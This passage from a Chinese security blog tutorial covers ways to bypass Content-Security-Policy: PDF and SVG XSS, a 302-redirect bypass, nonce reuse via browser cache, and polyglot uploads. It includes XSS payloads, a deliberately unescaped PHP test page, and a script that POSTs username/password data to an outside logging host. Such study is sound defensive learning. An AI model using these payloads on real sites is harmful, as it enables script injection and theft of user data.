+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.91.140/test.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323175753026.png" alt="image-20210323175753026"></p>
+<p>当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等<br>具体可以看看这篇文章<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/microzone/article/details/52850623" >https://blog.csdn.net/microzone/article/details/52850623<i class="fas fa-external-link-alt"></i></a></p>
+<p>当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件。</p>
+<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG作为一个矢量图，但是却能够执行JavaScript脚本，如果页面中存在上传功能，并且没有过滤SVG，那么可以通过上传恶意SVG图像来XSS。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;Layer_1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 751 751&quot;</span> <span class="attr">enable-background</span>=<span class="string">&quot;new 0 0 751 751&quot;</span> <span class="attr">xml:space</span>=<span class="string">&quot;preserve&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">&quot;image0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;751&quot;</span> <span class="attr">height</span>=<span class="string">&quot;751&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0&quot;</span> <span class="attr">href</span>=<span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323180947513.png" alt="image-20210323180947513"></p>
+<h3 id="302重定向"><a href="#302重定向" class="headerlink" title="302重定向"></a>302重定向</h3><p>参考自<a class="link"   target="_blank" rel="noopener" href="https://lorexxar.cn/2016/10/31/csp-then2/" >CSP进阶-302 Bypass CSP<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;192.168.91.140&#x2F;a&quot;);</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     csp header test </span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">     &lt;&#x2F;script&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里CSP没有设置<code>default-src</code>，只设置了<code>script-src</code>中仅仅允许了两个域：</p>
+<ul>
+<li>自己的域</li>
+<li><code>http://192.168.91.140/a</code></li>
+</ul>
+<p>在第一个域下的某个位置有个可以定义重定向的页面，比如<code>http://127.0.0.1/302.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_GET</span>[u]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后我们需要有一个上传文件的域，这里是<code>http://192.168.91.140/b/</code>，我们上传的文件都放在这个文件夹，由于我们设置的<code>script-src</code>并不包含这个域，因此不能使用<code>&lt;script&gt;</code>标签直接引用这个域下的内容，但是<code>script-src</code>包含了<code>http://192.168.91.140/a/</code>这个域，<strong>也就是我们上传目录的根域和他允许的域的根域是一样的</strong>，那么我们就可以利用重定向来绕过CSP。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;CSP&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;192.168.91.140&#x2F;b&#x2F;xss.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>b.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var xml &#x3D; new XMLHttpRequest(); </span><br><span class="line">xml.open(&#39;POST&#39;, &#39;http:&#x2F;&#x2F;t6n089.ceye.io&#39;, true); </span><br><span class="line">xml.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;); </span><br><span class="line">xml.send(&#39;username&#x3D;123&amp;password&#x3D;123&#39;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210324114801148.png" alt="image-20210324114801148"></p>
+<h3 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><p>这个是用来绕过<code>script nonce</code>的一个方法：<a class="link"   target="_blank" rel="noopener" href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" >通过浏览器缓存来bypass CSP script nonce<i class="fas fa-external-link-alt"></i></a></p>
+<p>这个看了个大概意思，也不知道行不行：</p>
+<p>​    就是利用修改<code>location.hash</code>览器不会请求服务器，那么nonce string就不会更换的方法。先找到要攻击页面的同源域下的另一个没有CSP保护的页面，在这个页面构造XSS，先开一个<code>&lt;iframe&gt;</code>请求要攻击的页面，获取到nonce值后，再新建一个<code>&lt;iframe&gt;</code>，添加带有nonce字符串的<code>&lt;iframe&gt;</code>窗口请求要攻击的页面，执行任意XSS。其中所有的<code>&lt;iframe&gt;</code>的<code>src</code>属性都只修改<code>#</code>后面的内容来避免刷新<code>nonce</code>。</p>
+<h3 id="上传带有JS的文件"><a href="#上传带有JS的文件" class="headerlink" title="上传带有JS的文件"></a>上传带有JS的文件</h3><p>下面的方法其实不算是绕过CSP，实际上是绕过了上传的过滤规则，然后在域内进行调用，其实是遵守了CSP的规则。</p>
+<ul>
+<li>带有JS的JPEG</li>
+</ul>
+<p><a class="link"   target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/07/polyglot-JPEGs-bypass-csp/" >using polyglot JPEGs bypass CSP 分析<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li>带有JS的Wave</li>
+</ul>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw" >使用 Wave 文件绕过 CSP 策略<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5084#toc-13" >我的CSP绕过思路及总结<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.szfszf.top/article/32/" >CSP 概念及绕过分析总结<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：CSP策略与绕过</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-24 16:27:21</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/24/CSP策略与绕过/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/18/DNSLog-%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">DNSLog 盲注总结</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSP%E7%AD%96%E7%95%A5%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-text">CSP策略与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSP%E7%9A%84%E5%BC%95%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="nav-text">CSP的引入方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSP%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-text">CSP常用指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%89%E9%A1%B9%E5%80%BC"><span class="nav-text">选项值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#script-src-%E7%9A%84%E7%89%B9%E6%AE%8A%E5%80%BC"><span class="nav-text">script-src 的特殊值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSP%E7%BB%95%E8%BF%87"><span class="nav-text">CSP绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC"><span class="nav-text">跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="nav-text">DNS预加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Iframe"><span class="nav-text">Iframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CDN"><span class="nav-text">CDN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%99%E7%82%B9%E5%8F%AF%E6%8E%A7%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90"><span class="nav-text">站点可控静态资源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%99%E7%82%B9%E5%8F%AF%E6%8E%A7JSONP"><span class="nav-text">站点可控JSONP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Base-uri"><span class="nav-text">Base-uri</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8"><span class="nav-text">利用浏览器自动补全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meta%E7%BD%91%E9%A1%B5%E8%B7%B3%E8%BD%AC"><span class="nav-text">meta网页跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#object-src%EF%BC%88PDFXSS%EF%BC%89"><span class="nav-text">object-src（PDFXSS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SVG"><span class="nav-text">SVG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#302%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">302重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98"><span class="nav-text">浏览器缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E5%B8%A6%E6%9C%89JS%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-text">上传带有JS的文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
